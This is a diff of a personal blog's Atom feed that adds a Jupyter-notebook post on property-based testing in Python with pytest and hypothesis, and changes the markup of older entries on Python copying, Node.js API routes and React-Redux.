@@ -1,8 +1,285 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Jack McKew's Blog</title><link href="https://jackmckew.dev/" rel="alternate"></link><link href="https://jackmckew.dev/feeds/all.atom.xml" rel="self"></link><id>https://jackmckew.dev/</id><updated>2020-10-09T00:00:00+11:00</updated><subtitle>Engineer | Software Developer | Data Scientist</subtitle><entry><title>Shallow vs Deep Copy in Python</title><link href="https://jackmckew.dev/shallow-vs-deep-copy-in-python.html" rel="alternate"></link><published>2020-10-09T00:00:00+11:00</published><updated>2020-10-09T00:00:00+11:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-10-09:/shallow-vs-deep-copy-in-python.html</id><summary type="html">&lt;body&gt;&lt;div class="cell border-box-sizing text_cell rendered"&gt;&lt;div class="prompt input_prompt"&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Jack McKew's Blog</title><link href="https://jackmckew.dev/" rel="alternate"></link><link href="https://jackmckew.dev/feeds/all.atom.xml" rel="self"></link><id>https://jackmckew.dev/</id><updated>2020-10-16T00:00:00+11:00</updated><subtitle>Engineer | Software Developer | Data Scientist</subtitle><entry><title>Property Based Testing in Python</title><link href="https://jackmckew.dev/property-based-testing-in-python.html" rel="alternate"></link><published>2020-10-16T00:00:00+11:00</published><updated>2020-10-16T00:00:00+11:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-10-16:/property-based-testing-in-python.html</id><summary type="html">&lt;/head&gt;&lt;body&gt;&lt;div class="cell border-box-sizing text_cell rendered"&gt;&lt;div class="prompt input_prompt"&gt;
 &lt;/div&gt;&lt;div class="inner_cell"&gt;
 &lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
-&lt;h2 id="Shallow-vs-Deep-Copy-in-Python"&gt;Shallow vs Deep Copy in Python&lt;a class="anchor-link" href="#Shallow-vs-Deep-Copy-in-Python"&gt;¶&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;One of the utmost crucial parts in all programming languages is maintaining variables. We create, modify, compare, delete our variables to build more complex systems that eventually make up the software we use. This is typically done by using the &lt;code&gt;=&lt;/code&gt; operator (eg &lt;code&gt;x = 5 …&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;div class="cell border-box-sizing text_cell rendered"&gt;&lt;div class="prompt input_prompt"&gt;
+&lt;p&gt;Building software can be challenging, but maintaining it after that initial build can be even moreso. Being able to test the software such that it verifies the software behaves as expected is crucial in building robust software applications that users depend upon, being able to automate this testing is even …&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;</summary><content type="html">&lt;/head&gt;&lt;body&gt;&lt;div class="cell border-box-sizing text_cell rendered"&gt;&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Building software can be challenging, but maintaining it after that initial build can be even moreso. Being able to test the software such that it verifies the software behaves as expected is crucial in building robust software applications that users depend upon, being able to automate this testing is even better! There's other blog posts on this blog around the topic of testing &lt;a href="https://jackmckew.dev/introduction-to-pytest-pipenv.html"&gt;Introduction to Pytest &amp;amp; Pipenv&lt;/a&gt;, but for this post we're going to focus on a very specific type of testing, &lt;strong&gt;property based testing&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Property based testing differs itself from the conventional example based testing by being able to generate the test data that drives your tests, and even better, can help find the boundaries of where the tests fail.&lt;/p&gt;
+&lt;p&gt;To demonstrate the power of property based testing, we're going to build some testing for the old faithful multiplication operator in Python.&lt;/p&gt;
+&lt;p&gt;To help with this, we are going to use a few packages:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;pytest (testing framework)&lt;/li&gt;
+&lt;li&gt;hypothesis (property testing package)&lt;/li&gt;
+&lt;li&gt;ipytest (to enable running tests in jupyter notebooks)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Before we dive in, let's set up ipytest and use some &lt;strong&gt;example-based testing&lt;/strong&gt; to verify the multiplication operator.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;In [5]:&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="input_area"&gt;
+&lt;div class="highlight hl-ipython3"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;ipytest&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pytest&lt;/span&gt;
+&lt;span class="n"&gt;ipytest&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;autoconfig&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;multiply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;number_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;number_2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;number_1&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;number_2&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;In [6]:&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="input_area"&gt;
+&lt;div class="highlight hl-ipython3"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;%%&lt;/span&gt;&lt;span class="k"&gt;run_pytest&lt;/span&gt;[clean]
+
+def test_example():
+    assert multiply(3,3) == 9
+    assert multiply(5,5) == 25
+    assert multiply(4,6) == 24
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+&lt;div class="output_area"&gt;
+&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="output_subarea output_stream output_stdout output_text"&gt;
+&lt;pre&gt;.                                                                        [100%]
+1 passed in 0.02s
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Fantastic, our examples passed the test! Now let's ensure that the test fails.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;In [7]:&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="input_area"&gt;
+&lt;div class="highlight hl-ipython3"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;%%&lt;/span&gt;&lt;span class="k"&gt;run_pytest&lt;/span&gt;[clean]
+
+def test_fail_example():
+    assert multiply(3,3) == 9
+    assert multiply(3,5) == 150
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+&lt;div class="output_area"&gt;
+&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="output_subarea output_stream output_stdout output_text"&gt;
+&lt;pre&gt;F                                                                        [100%]
+================================== FAILURES ===================================
+______________________________ test_fail_example ______________________________
+
+    def test_fail_example():
+        assert multiply(3,3) == 9
+&amp;gt;       assert multiply(3,5) == 150
+E       assert 15 == 150
+E        +  where 15 = multiply(3, 5)
+
+&amp;lt;ipython-input-7-212df0aaa8ed&amp;gt;:3: AssertionError
+=========================== short test summary info ===========================
+FAILED tmpg6kq2sek.py::test_fail_example - assert 15 == 150
+1 failed in 0.34s
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Perfect! We can see that the test fails as expected and even nicely tells us which line of code it failed on. Let's say we had lots of these examples that we wanted to test for, so to simplify it we could potentially use pytest's &lt;strong&gt;parametrize&lt;/strong&gt; decorator.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;In [8]:&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="input_area"&gt;
+&lt;div class="highlight hl-ipython3"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;%%&lt;/span&gt;&lt;span class="k"&gt;run_pytest&lt;/span&gt;[clean]
+
+@pytest.mark.parametrize('number_1, number_2 , expected', [
+    (3,3,9),
+    (5,5,25),
+    (4,6,24)
+])
+def test_multiply(number_1,number_2,expected):
+    assert expected == multiply(number_1,number_2)
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+&lt;div class="output_area"&gt;
+&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="output_subarea output_stream output_stdout output_text"&gt;
+&lt;pre&gt;...                                                                      [100%]
+3 passed in 0.02s
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Is this enough testing to verify our function? Really, we're only testing a few conditions that we'd expect to work, but in reality it's the ones that nobody foresees that would be ideal to capture in our tests. This also raises a few more things, the developer writing the tests may choose to write 2 or 2000 test cases but this doesn't guarantee anything when it comes to if it's truly covered.&lt;/p&gt;
+&lt;h2 id="Introduce-Property-Based-Testing"&gt;Introduce Property Based Testing&lt;a class="anchor-link" href="#Introduce-Property-Based-Testing"&gt;¶&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Property based testing is considered as generative testing, we don't supply specific examples with inputs and expected outputs. Rather we define certain properties and generate randomized inputs to ensure the properties are correct. In addition to this, property based testing can also &lt;code&gt;shrink&lt;/code&gt; outputs to find the exact boundary condition where a test fails.&lt;/p&gt;
+&lt;p&gt;While this doesn't 100% replace example-based testing, they definitely have their use and have a lot of potential for effective testing. Now let's implement the same tests above, using property based testing with &lt;code&gt;hypothesis&lt;/code&gt;.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;In [9]:&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="input_area"&gt;
+&lt;div class="highlight hl-ipython3"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;hypothesis&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;given&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hypothesis.strategies&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;st&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;In [10]:&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="input_area"&gt;
+&lt;div class="highlight hl-ipython3"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;%%&lt;/span&gt;&lt;span class="k"&gt;run_pytest&lt;/span&gt;[clean]
+
+@given(st.integers(),st.integers())
+def test_multiply(number_1,number_2):
+    assert multiply(number_1,number_2) == number_1 * number_2
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+&lt;div class="output_area"&gt;
+&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="output_subarea output_stream output_stdout output_text"&gt;
+&lt;pre&gt;.                                                                        [100%]
+1 passed in 0.14s
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Note that we've used the &lt;code&gt;given&lt;/code&gt; decorator which makes our test parametrized, and use strategies which cover the types of input data to generate. As per the hypothesis documentation &lt;em&gt;Most things should be easy to generate and everything should be possible&lt;/em&gt;, we can find more information on them here: &lt;a href="https://hypothesis.readthedocs.io/en/latest/data.html"&gt;https://hypothesis.readthedocs.io/en/latest/data.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Now this doesn't look any different to last time, so what even changed! Let's change our multiply function so it behaves strangely and see if we can see hypothesis shrink the failures in action. Shrinking is whenever it finds a failure, it'll try to get to the absolute boundary case to help us find the potential cause and even better it'll remember this failure for next time so it doesn't poke it's head up again!&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;In [15]:&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="input_area"&gt;
+&lt;div class="highlight hl-ipython3"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;bad_multiply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;number_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;number_2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;number_1&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;number_2&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;number_1&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;number_2&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;In [16]:&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="input_area"&gt;
+&lt;div class="highlight hl-ipython3"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;%%&lt;/span&gt;&lt;span class="k"&gt;run_pytest&lt;/span&gt;[clean]
+
+@given(st.integers(),st.integers())
+def test_bad_multiply(number_1,number_2):
+    assert bad_multiply(number_1,number_2) == number_1 * number_2
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+&lt;div class="output_area"&gt;
+&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="output_subarea output_stream output_stdout output_text"&gt;
+&lt;pre&gt;F                                                                        [100%]
+================================== FAILURES ===================================
+______________________________ test_bad_multiply ______________________________
+
+    @given(st.integers(),st.integers())
+&amp;gt;   def test_bad_multiply(number_1,number_2):
+
+&amp;lt;ipython-input-16-3e2ec463c8ad&amp;gt;:2: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+
+number_1 = 31, number_2 = 1
+
+    @given(st.integers(),st.integers())
+    def test_bad_multiply(number_1,number_2):
+&amp;gt;       assert bad_multiply(number_1,number_2) == number_1 * number_2
+E       assert 0 == (31 * 1)
+E        +  where 0 = bad_multiply(31, 1)
+
+&amp;lt;ipython-input-16-3e2ec463c8ad&amp;gt;:3: AssertionError
+--------------------------------- Hypothesis ----------------------------------
+Falsifying example: test_bad_multiply(
+    number_1=31, number_2=1,
+)
+=========================== short test summary info ===========================
+FAILED tmp8uis7_kv.py::test_bad_multiply - assert 0 == (31 * 1)
+1 failed in 0.22s
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Fantastic, we can see that the failure has been shrunken to &lt;code&gt;number_1&lt;/code&gt; being 31 and &lt;code&gt;number_2&lt;/code&gt; being 1 which is one integer off the 'bad' boundary conditions we'd introduced into the multiply function.&lt;/p&gt;
+&lt;p&gt;Hopefully this has introduced the power of property based testing and can help make software more robust for everyone!&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content><category term="Python"></category><category term="python"></category><category term="software-development"></category></entry><entry><title>Shallow vs Deep Copy in Python</title><link href="https://jackmckew.dev/shallow-vs-deep-copy-in-python.html" rel="alternate"></link><published>2020-10-09T00:00:00+11:00</published><updated>2020-10-09T00:00:00+11:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-10-09:/shallow-vs-deep-copy-in-python.html</id><summary type="html">&lt;/head&gt;&lt;body&gt;&lt;div class="cell border-box-sizing text_cell rendered"&gt;&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;h2 id="Shallow-vs-Deep-Copy-in-Python"&gt;Shallow vs Deep Copy in Python&lt;a class="anchor-link" href="#Shallow-vs-Deep-Copy-in-Python"&gt;¶&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;One of the utmost crucial parts in all programming languages is maintaining variables. We create, modify, compare, delete our variables to build more complex systems that eventually make up the software we use. This is typically done by using the &lt;code&gt;=&lt;/code&gt; operator (eg &lt;code&gt;x = 5 …&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;</summary><content type="html">&lt;/head&gt;&lt;body&gt;&lt;div class="cell border-box-sizing text_cell rendered"&gt;&lt;div class="prompt input_prompt"&gt;
 &lt;/div&gt;&lt;div class="inner_cell"&gt;
 &lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
 &lt;h2 id="Shallow-vs-Deep-Copy-in-Python"&gt;Shallow vs Deep Copy in Python&lt;a class="anchor-link" href="#Shallow-vs-Deep-Copy-in-Python"&gt;¶&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;One of the utmost crucial parts in all programming languages is maintaining variables. We create, modify, compare, delete our variables to build more complex systems that eventually make up the software we use. This is typically done by using the &lt;code&gt;=&lt;/code&gt; operator (eg &lt;code&gt;x = 5&lt;/code&gt;), but sometimes this doesn't always do what we expect. This is going to be a deep  dive into different types of &lt;code&gt;copy&lt;/code&gt; in Python.&lt;/p&gt;
@@ -399,7 +676,7 @@ Let's modify A[2][0] = 100
 &lt;p&gt;Hopefully being aware of how the default behaviour works, and the potential solutions will help when debugging strange behaviour when using variables in Python!&lt;/p&gt;
 &lt;/div&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;/body&gt;</content><category term="Data Science"></category><category term="datascience"></category><category term="python"></category></entry><entry><title>API Routes in Node.js</title><link href="https://jackmckew.dev/api-routes-in-nodejs.html" rel="alternate"></link><published>2020-10-02T00:00:00+10:00</published><updated>2020-10-02T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-10-02:/api-routes-in-nodejs.html</id><summary type="html">&lt;body&gt;&lt;p&gt;First off what's an API and more specifically what's an API route? API stands for Application Programming Interface, meaning it's how to communicate with the system you are creating. A route within an API is a specific path to take to get specific information or data out of. This post …&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;First off what's an API and more specifically what's an API route? API stands for Application Programming Interface, meaning it's how to communicate with the system you are creating. A route within an API is a specific path to take to get specific information or data out of. This post will dive into how to set up API routes in Nodejs with express.&lt;/p&gt;
+&lt;/div&gt;</content><category term="Data Science"></category><category term="datascience"></category><category term="python"></category></entry><entry><title>API Routes in Node.js</title><link href="https://jackmckew.dev/api-routes-in-nodejs.html" rel="alternate"></link><published>2020-10-02T00:00:00+10:00</published><updated>2020-10-02T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-10-02:/api-routes-in-nodejs.html</id><summary type="html">&lt;/head&gt;&lt;body&gt;&lt;p&gt;First off what's an API and more specifically what's an API route? API stands for Application Programming Interface, meaning it's how to communicate with the system you are creating. A route within an API is a specific path to take to get specific information or data out of. This post …&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;/head&gt;&lt;body&gt;&lt;p&gt;First off what's an API and more specifically what's an API route? API stands for Application Programming Interface, meaning it's how to communicate with the system you are creating. A route within an API is a specific path to take to get specific information or data out of. This post will dive into how to set up API routes in Nodejs with express.&lt;/p&gt;
 &lt;p&gt;We start by 'importing' express into our route and instantiating a router from the express library.&lt;/p&gt;
 &lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
 2&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;express&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'express'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
@@ -532,8 +809,8 @@ Let's modify A[2][0] = 100
 &lt;span class="p"&gt;})&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
-&lt;p&gt;By piecing together many of these API routes (also known as endpoints) we can build a functional API that can drive our applications. For example, the application in the end may make a &lt;code&gt;GET&lt;/code&gt; request to get all the latest posts by other users, and makes a &lt;code&gt;POST&lt;/code&gt; request when you add a new post, and so on with all the different types of API routes.&lt;/p&gt;&lt;/body&gt;</content><category term="Javascript"></category><category term="javascript"></category></entry><entry><title>Actions and Reducers in React-Redux</title><link href="https://jackmckew.dev/actions-and-reducers-in-react-redux.html" rel="alternate"></link><published>2020-09-25T00:00:00+10:00</published><updated>2020-09-25T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-09-25:/actions-and-reducers-in-react-redux.html</id><summary type="html">&lt;body&gt;&lt;p&gt;Redux is a &lt;em&gt;predictable state container for JavaScript applications&lt;/em&gt;, and React is &lt;em&gt;a JavaScript library for building user interfaces&lt;/em&gt;. To bridge the two, you get &lt;code&gt;react-redux&lt;/code&gt; which allows our user interfaces to interact &amp;amp; respond to the current state of the application.&lt;/p&gt;
-&lt;p&gt;In this post let's go into actions and reducers …&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;Redux is a &lt;em&gt;predictable state container for JavaScript applications&lt;/em&gt;, and React is &lt;em&gt;a JavaScript library for building user interfaces&lt;/em&gt;. To bridge the two, you get &lt;code&gt;react-redux&lt;/code&gt; which allows our user interfaces to interact &amp;amp; respond to the current state of the application.&lt;/p&gt;
+&lt;p&gt;By piecing together many of these API routes (also known as endpoints) we can build a functional API that can drive our applications. For example, the application in the end may make a &lt;code&gt;GET&lt;/code&gt; request to get all the latest posts by other users, and makes a &lt;code&gt;POST&lt;/code&gt; request when you add a new post, and so on with all the different types of API routes.&lt;/p&gt;</content><category term="Javascript"></category><category term="javascript"></category></entry><entry><title>Actions and Reducers in React-Redux</title><link href="https://jackmckew.dev/actions-and-reducers-in-react-redux.html" rel="alternate"></link><published>2020-09-25T00:00:00+10:00</published><updated>2020-09-25T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-09-25:/actions-and-reducers-in-react-redux.html</id><summary type="html">&lt;/head&gt;&lt;body&gt;&lt;p&gt;Redux is a &lt;em&gt;predictable state container for JavaScript applications&lt;/em&gt;, and React is &lt;em&gt;a JavaScript library for building user interfaces&lt;/em&gt;. To bridge the two, you get &lt;code&gt;react-redux&lt;/code&gt; which allows our user interfaces to interact &amp;amp; respond to the current state of the application.&lt;/p&gt;
+&lt;p&gt;In this post let's go into actions and reducers …&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;/head&gt;&lt;body&gt;&lt;p&gt;Redux is a &lt;em&gt;predictable state container for JavaScript applications&lt;/em&gt;, and React is &lt;em&gt;a JavaScript library for building user interfaces&lt;/em&gt;. To bridge the two, you get &lt;code&gt;react-redux&lt;/code&gt; which allows our user interfaces to interact &amp;amp; respond to the current state of the application.&lt;/p&gt;
 &lt;p&gt;In this post let's go into actions and reducers. First off, what is an action and what is a reducer in this context? &lt;strong&gt;Actions&lt;/strong&gt; are payloads of information that send data from the application to the redux store. &lt;strong&gt;Reducers&lt;/strong&gt; specify how the application's state changes in response to actions sent to the store. It is summarized in the graphic:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Redux State Diagram" class="img-fluid" src="https://jackmckew.dev/img/redux-diagram.png"/&gt;&lt;/p&gt;
 &lt;p&gt;Let's use &lt;code&gt;react-redux&lt;/code&gt; to build a system which we can alert users when things trigger. For this we will need to build an action, a reducer and a component to display the alert.&lt;/p&gt;
@@ -693,7 +970,7 @@ Let's modify A[2][0] = 100
 &lt;h3 id="default"&gt;Default&lt;/h3&gt;
 &lt;p&gt;If neither setting or removing an alert, don't change the state at all.&lt;/p&gt;
 &lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
-&lt;p&gt;Using &lt;code&gt;react-redux&lt;/code&gt; we can create a responsive web application which enhances the user experience!&lt;/p&gt;&lt;/body&gt;</content><category term="Javascript"></category><category term="javascript"></category></entry><entry><title>Components in React.js</title><link href="https://jackmckew.dev/components-in-reactjs.html" rel="alternate"></link><published>2020-09-18T00:00:00+10:00</published><updated>2020-09-18T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-09-18:/components-in-reactjs.html</id><summary type="html">&lt;body&gt;&lt;p&gt;To put it simply, components are the building blocks that make up the app in React.js. A component more specifically is a JavaScript class or function that optionally accepts inputs (aka properties or props) and returns a React element that describes how a section of the interface should appear …&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;To put it simply, components are the building blocks that make up the app in React.js. A component more specifically is a JavaScript class or function that optionally accepts inputs (aka properties or props) and returns a React element that describes how a section of the interface should appear.&lt;/p&gt;
